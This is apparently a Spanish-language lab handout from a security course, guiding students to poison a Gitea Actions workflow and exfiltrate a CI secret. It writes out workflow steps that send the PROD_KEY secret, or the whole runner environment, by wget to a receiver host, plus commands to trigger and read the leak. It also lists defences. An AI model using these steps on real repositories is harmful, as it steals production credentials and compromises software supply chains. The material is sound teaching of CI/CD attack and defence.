# 05 - Workflow malicioso en Gitea Actions

**Clase 2 · 30 min · M3 Demo 04**
**Fase:** ejecucion en CI / exfiltracion de secretos
**MITRE ATT&CK:** T1195.002 (Compromise Software Supply Chain), T1552.001 (Credentials In Files)
**Riesgo OWASP CI/CD:** CICD-SEC-4 (pipeline envenenado), CICD-SEC-6 (higiene de credenciales)

## Escenario

Tienes la cuenta de `dev`, que puede escribir en el repo. El repo tiene un
workflow de Gitea Actions que se ejecuta en cada push a `main`. Ese workflow
tiene acceso a un secreto de CI llamado `PROD_KEY`. Tu objetivo: hacer que el
secreto salga del runner sin romper el pipeline.

El equivalente en GitHub Actions es identico: si puedes cambiar el YAML, puedes
leer los secretos que el workflow recibe.

Caso real: CVE-2026-33634 (marzo de 2026) comprometio los tags de
`aquasecurity/trivy-action` y `setup-trivy` y los cambio por codigo que robaba
credenciales del runner. No hacia falta escribir el workflow: bastaba con que el
workflow confiara en un tag de un tercero. La defensa fue fijar acciones por SHA
inmutable y rotar los secretos expuestos.

## Objetivo de aprendizaje

- Modificar un workflow y dispararlo con un push.
- Entender como se inyectan los secretos (`${{ secrets.X }}`).
- Comprobar la exfiltracion en un receptor controlado.

## Antes de empezar

El runner tiene que estar **Online**:
http://localhost:3000/-/admin/actions/runners (si no, `make ci`).

El secreto `PROD_KEY` existe en *repo -> Settings -> Actions -> Secrets*.

```bash
cd /tmp && rm -rf lab05
git clone http://dev:dev12345@localhost:3000/devops-org/devops-demo.git lab05
cd lab05
curl -s http://localhost:8888/__clear
```

## Paso 1 - Leer el workflow legitimo

```bash
cat .gitea/workflows/notify.yml
```

**Que esperar:** un job `notify` con `runs-on: ubuntu-latest` que hace un POST a
`http://hookcat:8888/gitea/notify` usando `wget`.

Fijate en `shell: sh` y en `wget`: el runner ejecuta los steps en `alpine`, que
no trae `bash` ni `curl`. Ese detalle importa para que tu step funcione.

## Paso 2 - Anadir el step de exfiltracion

Edita `.gitea/workflows/notify.yml` y anade al final de `steps`:

```yaml
      - name: exfil
        shell: sh
        env:
          KEY: ${{ secrets.PROD_KEY }}
        run: |
          wget -qO- --post-data "key=$KEY" http://hookcat:8888/actions/leak
```

**Por que funciona:** `env` hace que el runner resuelva el secreto y lo pase
como variable de entorno al step. El YAML lo controla quien escribe en el repo;
el secreto lo pone la plataforma. Esa asimetria es el fallo.

## Paso 3 - Commit y push

```bash
git -c user.name=dev -c user.email=dev@lab.local commit -am "notify: add metrics"
git push
```

**Que esperar:** Gitea encola el workflow. En *Actions* del repo aparece un run
nuevo; tarda unos segundos.

## Paso 4 - Leer el secreto en hookcat

```bash
sleep 15
curl -s http://localhost:8888/__requests \
  | python3 -c 'import sys,json;[print(x["path"],"|",x["body"]) for x in json.load(sys.stdin)]'
```

**Que esperar:**

```
/actions/leak | key=FLAG{gitea_actions_secret}
/gitea/notify | repo=devops-org/devops-demo actor=dev
```

Si no aparece, mira el run en la UI: el log te dice si el step fallo por shell,
por red o por permisos.

## Paso 5 - Limpiar el repo

El workflow malicioso sigue en `main`. Reviertelo para dejar el lab como estaba:

```bash
git revert --no-edit HEAD
git push
```

**Por que:** en un engagement real no dejarias un backdoor en el repo del
cliente sin documentarlo. En el curso, ademas, el siguiente alumno espera el
estado inicial.

## Variante mas agresiva

En vez de un secreto concreto, volcar todo el entorno:

```yaml
        run: |
          env | sort | wget -qO- --post-data-binary @- http://hookcat:8888/actions/env
```

Algunos runners exportan secretos como variables de entorno. Prueba a ver que
aparece; es una buena discusion para la clase.

## Evidencia para el informe

- Diff del workflow (antes/despues).
- Run de Actions con su ID y resultado.
- Peticion `/actions/leak` con el secreto y hora.
- Confirmacion de que el secreto era de produccion (`PROD_KEY`).

## Checkpoint

1. Por que el atacante necesita permiso de escritura en el repo, y por que a
   veces ni eso (fork + `pull_request_target`)?
2. Que diferencia hay entre un secreto de repositorio y uno de entorno?
3. Por que `shell: sh` y `wget` en este lab?

## Defensa

- Los workflows de PRs de forks no deben recibir secretos.
- Requerir aprobacion para cambios en `.gitea/workflows` (CODEOWNERS).
- Secretos por entorno, rotacion y scope minimo al token del job.
- Auditar runs que hacen peticiones salientes raras o leen `env`.
- Egress allowlist desde el runner.

## Si algo falla

| Sintoma | Causa / arreglo |
|---|---|
| El run no aparece | el runner esta Offline: `make ci` |
| `bash: not found` | el runner usa alpine: declara `shell: sh` |
| `curl: not found` | usa `wget` (viene en alpine) |
| El step falla con 403 | `PROD_KEY` no existe: revisa Settings -> Actions -> Secrets |
| No llega a hookcat | desde el contenedor es `http://hookcat:8888`, no `localhost` |
